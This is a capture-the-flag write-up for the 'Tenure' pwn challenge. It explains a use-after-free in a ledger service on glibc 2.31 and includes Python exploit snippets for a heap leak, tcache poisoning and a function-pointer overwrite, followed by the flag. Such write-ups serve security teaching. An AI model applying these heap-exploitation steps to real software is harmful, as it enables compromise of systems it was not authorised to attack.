# Tenure

**Category:** Pwn | **Author:** Ebo | **Flag:** `HZ{lJYzr-ov_t3nur3__zBk0L4n}`

## Challenge Description

A small ledger service (Rust, but the ledger storage uses raw `malloc`/`free`).
It lets you allocate entries, write to them, display them, and "retire" them.

> Nobody ever taught the desk what to do once an entry is retired.

## Initial Analysis

Files: `tenure`, `libc.so.6` (glibc 2.31), `ld-linux-x86-64.so.2`.

`checksec`:

```text
Arch:       amd64
RELRO:      Full RELRO
Stack:      No canary
NX:         NX enabled
PIE:        No PIE (0x200000)
Stripped:   No
```

Full RELRO + NX rules out GOT overwrites and heap shellcode, but no PIE means
code addresses are fixed, and it's unstripped: `tenure::noop`, `request_flag_op`.
Reading `tenure::main` reveals the command protocol (16 slots, sizes 1–1024):

```text
ADD <index> <size>
FREE <index>
WRITE <index> <length>\n<raw bytes>\n
SHOW <index> <length>
STATUS
QUIT
```

## The Vulnerability / Core Concept

**Use-after-free.** `FREE` releases an entry's memory but never clears its
`present` flag or `data` pointer, so `SHOW` and `WRITE` keep reading/writing the
freed chunk:

```c
void retire(size_t i) {
    if (i < 16 && entries[i].present) {
        free(entries[i].data);
        // BUG: present stays true, data stays set
    }
}
```

glibc 2.31 predates tcache **safe-linking**, so freed chunks store a plain
(unencoded) forward pointer. The UAF gives both a **heap leak** (read a freed
chunk's `next`) and a **heap write** (overwrite it) — classic **tcache
poisoning**: rewrite `B->next` to any target and the next-but-one allocation of
that size is returned *at that target*.

**Target:** at startup the program allocates a 32-byte table of four function
pointers (all `noop`); `STATUS` calls `dispatch_table[0]`. The binary also
contains `request_flag_op`, which talks to `/run/flag-dispenser/S.flag` and
prints the flag. So overwriting `dispatch_table[0]` with `request_flag_op` and
running `STATUS` wins — no ROP, no shell.

## Exploitation

Full exploit in `solve.py`.

1. **Fill the 0x30 tcache bin and leak a heap address:**

   ```python
   add(0, 0x20); add(1, 0x20); retire(0); retire(1)
   first_chunk = u64(show(1, 8))          # B->next leaks A's address
   dispatch_table = first_chunk - DISPATCH_DELTA
   ```

   The startup allocation order is deterministic, so the dispatch table sits a
   fixed distance from the first ledger chunk (`0x42e0` on the hosted build,
   `0x4070` locally — the hosted runner has `CORRELATION_ID` in its environment,
   which shifts a few startup allocations).

2. **Poison and reclaim the table:**

   ```python
   write(1, p64(dispatch_table))          # B->next = dispatch table
   add(2, 0x20)                           # returns entry 1's old chunk
   add(3, 0x20)                           # returns the dispatch table
   ```

3. **Derive `request_flag_op` (handles the hosted build difference).** The
   downloadable and hosted ELFs differ in absolute addresses, but
   `request_flag_op` is `0xf0` bytes after `noop` in both. After tcache returns
   the table, glibc clears the key word, so a correct probe reads
   `[noop, 0, noop, noop]`:

   ```python
   table = show(3, 0x20)
   noop = u64(table[:8])
   assert u64(table[16:24]) == noop and u64(table[24:32]) == noop
   request_flag_op = noop + 0xf0
   ```

4. **Overwrite the callback and trigger it:**

   ```python
   write(3, p64(request_flag_op))
   io.sendline(b"STATUS")                 # calls dispatch_table[0] = request_flag_op
   ```

Local testing uses a fake Unix-socket flag dispenser mounted at the expected
absolute path via Bubblewrap:

```bash
./solve.py FAKE=1                         # -> Haruulzangi{LOCAL_EXPLOIT_CONFIRMED}
./solve.py REMOTE HOST=127.0.0.1 PORT=1337
```

(Remote used a WebSocket bridged to a local TCP port.)

## Flag

`HZ{lJYzr-ov_t3nur3__zBk0L4n}`

## Key Takeaways

- One missing `present = false` after `free` yields a UAF that provides both a
  heap leak and a heap write — enough on a pre-safe-linking allocator to redirect
  a future allocation onto a function-pointer table.
- glibc 2.31 tcache stores unencoded `next` pointers; poisoning is a direct
  overwrite.
- Derive target addresses relative to a leaked known symbol (`noop + 0xf0`)
  instead of hard-coding them, so the exploit survives small build differences
  between the handout and the hosted binary.
- When you retire an object, invalidate every reference that can still reach it,
  not just its backing memory.
